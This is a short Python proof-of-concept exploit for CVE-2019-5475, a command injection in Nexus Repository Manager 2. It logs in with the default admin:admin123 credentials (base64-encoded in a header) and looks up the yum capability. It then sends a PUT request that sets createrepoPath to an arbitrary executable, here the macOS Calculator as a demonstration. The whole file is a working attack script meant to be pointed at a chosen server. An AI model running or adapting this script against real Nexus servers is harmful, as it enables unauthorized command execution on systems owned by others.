#coding=utf-8

import requests
import sys

'''
PoC of CVE-2019-5475
Author: shadowsock5 on 2019/9/13

References: 
- https://hackerone.com/reports/654888
- https://support.sonatype.com/hc/en-us/articles/360033490774-CVE-2019-5475-Nexus-Repository-Manager-2-OS-Command-Injection-2019-08-09
'''

remote = "http://cqq.com:8081"   # Change this to the base url(protocol, hostname and port) you want to exploit.

headers = {
    "Accept": "application/json",
    "Authorization": "Basic YWRtaW46YWRtaW4xMjM=",    # base64 version of admin:admin123, ref: CVE-2019-9629
}

json_payload = {
  "typeId": "yum",
  "enabled": "true",
  "properties": [
    {
      "key": "createrepoPath",
      "value": "/Applications/Calculator.app/Contents/MacOS/Calculator"
    }
  ]
}


capa_id_url = remote + "/nexus/service/siesta/capabilities"

''' fetch the capability id '''
def get_vul_url(p_url):
    r = requests.get(p_url, verify=False, headers=headers, allow_redirects=False)
    capa_id = ""
    
    if r.status_code == 200:
        if r.json():
            for j in r.json():
                if j['capability']['typeId'] == "yum":
                	print("[*] Vulnerable id is: {0}".format(j['capability']['id']))
                	capa_id = j['capability']['id']

    elif r.status_code == 401:
      print("[!] User credentials wrong! Quit!")
      sys.exit()

    p_vul_url = p_url + "/" + capa_id
    return p_vul_url


vul_url = get_vul_url(capa_id_url)

requests.put(vul_url, headers=headers, json=json_payload)
print("[*] Done")
